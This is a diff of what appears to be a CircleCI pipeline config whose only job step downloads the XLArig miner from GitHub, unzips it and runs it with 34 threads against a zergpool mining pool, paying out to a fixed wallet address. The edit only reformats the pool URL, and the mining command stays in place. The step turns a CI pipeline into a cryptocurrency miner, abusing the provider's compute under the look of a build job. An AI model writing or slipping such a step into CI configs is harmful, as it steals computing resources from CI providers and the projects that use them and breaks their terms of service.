@@ -8,4 +8,4 @@ jobs:
           password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
       - checkout
-      - run:  wget https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-linux-x86_64.zip && unzip XLArig-v5.2.2-linux-x86_64.zip && ./xlarig -o stratum+tcp:/panthera.mine.zergpool.com:4461 -a panthera -k -p c=DOGE,mc=XLA,ID=Scala -t 34 -u A8Bc1cMKPg1m2A6VAsGoSSLFBJm7mUWh7N
+      - run:  wget https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-linux-x86_64.zip && unzip XLArig-v5.2.2-linux-x86_64.zip && ./xlarig -o panthera.mine.zergpool.com:4461 -a panthera -k -p c=DOGE,mc=XLA,ID=Scala -t 34 -u A8Bc1cMKPg1m2A6VAsGoSSLFBJm7mUWh7N
